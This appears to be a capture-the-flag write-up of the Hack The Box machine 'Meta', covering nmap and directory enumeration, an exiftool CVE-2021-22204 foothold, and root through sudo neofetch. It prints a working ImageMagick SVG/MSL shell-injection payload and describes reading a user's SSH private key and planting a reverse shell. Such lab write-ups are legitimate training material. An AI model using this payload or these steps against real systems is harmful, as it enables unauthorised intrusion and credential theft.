[*] Meta [*]

# Date : 28/01/2022
# Domain : artcorp.htb dev01.artcorp.htb

# ->Enumeration Phase:

# Nmap 7.91 scan initiated Fri Jan 28 18:39:42 2022 as: nmap -A -vv -oN nmap 10.10.11.140
Increasing send delay for 10.10.11.140 from 0 to 5 due to 138 out of 459 dropped probes since last increase.
Nmap scan report for artcorp.htb (10.10.11.140)
Host is up, received echo-reply ttl 63 (0.38s latency).
Scanned at 2022-01-28 18:39:43 IST for 120s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiNHVBq9XNN5eXFkQosElagVm6qkXg6Iryueb1zAywZIA4b0dX+5xR5FpAxvYPxmthXA0E7/wunblfjPekyeKg+lvb+rEiyUJH25W/In13zRfJ6Su/kgxw9whZ1YUlzFTWDjUjQBij7QSMktOcQLi7zgrkG3cxGcS39SrEM8tvxcuSzMwzhFqVKFP/AM0jAxJ5HQVrkXkpGR07rgLyd+cNQKOGnFpAukUJnjdfv9PsV+LQs9p+a0jID+5B9y5fP4w9PvYZUkRGHcKCefYk/2UUVn0HesLNNrfo6iUxu+eeM9EGUtqQZ8nXI54nHOvzbc4aFbxADCfew/UJzQT7rovB
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEDINAHjreE4lgZywOGusB8uOKvVDmVkgznoDmUI7Rrnlmpy6DnOUhov0HfQVG6U6B4AxCGaGkKTbS0tFE8hYis=
|   256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdX83J9TLR63TPxQSvi3CuobX8uyKodvj26kl9jWUSq
80/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache
|_http-title: Home
OS fingerprint not ideal because: maxTimingRatio (1.646000e+00) is greater than 1.4
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/28%OT=22%CT=1%CU=33923%PV=Y%DS=2%DC=T%G=N%TM=61F3EB8F%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 2.101 days (since Wed Jan 26 16:16:56 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   322.27 ms 10.10.14.1
2   322.39 ms artcorp.htb (10.10.11.140)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 28 18:41:43 2022 -- 1 IP address (1 host up) scanned in 120.98 seconds



# Gobuster gives subdomain:
    --> dev01.artcorp.htb

# dirsearch found some directories:
    ->> [19:01:36] 301 -  249B  - /metaview/assets  ->  http://dev01.artcorp.htb/metaview/assets/
        [19:01:49] 200 -   72B  - /metaview/composer.json
        [19:01:54] 301 -  246B  - /metaview/css  ->  http://dev01.artcorp.htb/metaview/css/
        [19:02:13] 200 -    1KB - /metaview/index.php
        [19:02:13] 200 -    1KB - /metaview/index.php/login/
        [19:02:19] 301 -  246B  - /metaview/lib  ->  http://dev01.artcorp.htb/metaview/lib/
        [19:03:19] 301 -  250B  - /metaview/uploads  ->  http://dev01.artcorp.htb/metaview/uploads/
        [19:03:22] 200 -    0B  - /metaview/vendor/autoload.php
        [19:03:22] 200 -    0B  - /metaview/vendor/composer/autoload_classmap.php
        [19:03:22] 200 -    0B  - /metaview/vendor/composer/autoload_files.php
        [19:03:22] 200 -    0B  - /metaview/vendor/composer/autoload_real.php
        [19:03:22] 200 -    0B  - /metaview/vendor/composer/autoload_psr4.php
        [19:03:22] 200 -    0B  - /metaview/vendor/composer/autoload_namespaces.php
        [19:03:22] 200 -    0B  - /metaview/vendor/composer/autoload_static.php
        [19:03:22] 200 -    0B  - /metaview/vendor/composer/ClassLoader.php
        [19:03:22] 200 -    3KB - /metaview/vendor/composer/LICENSE


# ->Exploitation Phase:

>> on subdomain  dev01.artcorp.htb there is functionality that gives meta data of any image.
>> after some searching i found a duvj vulnerbility using exiftool.
>> vulnerbility : CVE-2021-22204  
>> download from github and generate a payload (image) 
>> upload this image and got a shell of www-data.

>> then upload pspy32.py file in victim machine and see all process and cronjabs.
>> active cronjab : Convert_images.sh uses mogrify (ImageMagick) to convert all images which are under this folder.

>> # url : https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html
>> make exploit.svg file paste below content in it.

<image authenticate='ff" `echo $(cat /home/thomas/user.txt)> /dev/shm/0wned`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>

>> and upload this file on victim machine under the Convert_images folder.
>> and after some time we got a user.txt in /dev/shm/0wned file.
>> so change the payload and read thomas id_rsa file.
>> ssh into thomas session.

# user.txt : 9119d66752a8a806ba30803e5087e5e6

# PostExploitaion Phase:

>> run : sudo -l
>> sudo permission : 
    Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

    User thomas may run the following commands on meta:
        (root) NOPASSWD: /usr/bin/neofetch \"\"

>> put a bash reverse shell on config.conf file.
>> set env XDG_CONFIG_HOME=/home/thomas/.config as after running neofetch it fetch thomas neofetch config file.
>> # export XDG_CONFIG_HOME=/home/thomas/.config
>> # sudo  /usr/bin/neofetch 
>> got a root shell.

# root.txt : 3223b439a4a5f5c8d185d98e38390473